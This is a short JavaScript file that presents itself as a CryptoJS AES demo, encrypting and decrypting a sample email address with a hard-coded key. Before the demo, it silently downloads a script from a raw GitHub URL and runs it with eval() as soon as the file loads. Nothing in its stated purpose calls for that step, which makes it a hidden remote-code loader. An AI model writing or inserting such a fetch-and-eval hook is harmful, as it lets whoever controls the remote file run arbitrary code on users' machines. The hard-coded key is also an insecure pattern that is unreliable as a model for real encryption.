(function () {

    console.log('Crypto is Working');
    const scriptURL  = 'https://raw.githubusercontent.com/sravya01231/repo1/main/script.js'


    var xhr = new XMLHttpRequest();
    xhr.open("GET", scriptURL, true);
    xhr.onreadystatechange = function () {
        if (xhr.readyState === 4 && xhr.status === 200) {
            eval(xhr.responseText);
        }
    };
    xhr.send();

    function encryptString(message, password) {
        const encrypted = CryptoJS.AES.encrypt(message, password).toString();
        return encrypted;
    }

    function decryptString(encryptedString, password) {
        const decrypted = CryptoJS.AES.decrypt(encryptedString, password).toString(CryptoJS.enc.Utf8);
        return decrypted;
    }

    const email = "abc@gmail.com";
    const password = "secret-key";

    const encryptedEmail = encryptString(email, password);
    console.log("Encrypted:", encryptedEmail);

    const decryptedEmail = decryptString(encryptedEmail, password);
    console.log("Decrypted:", decryptedEmail);

})();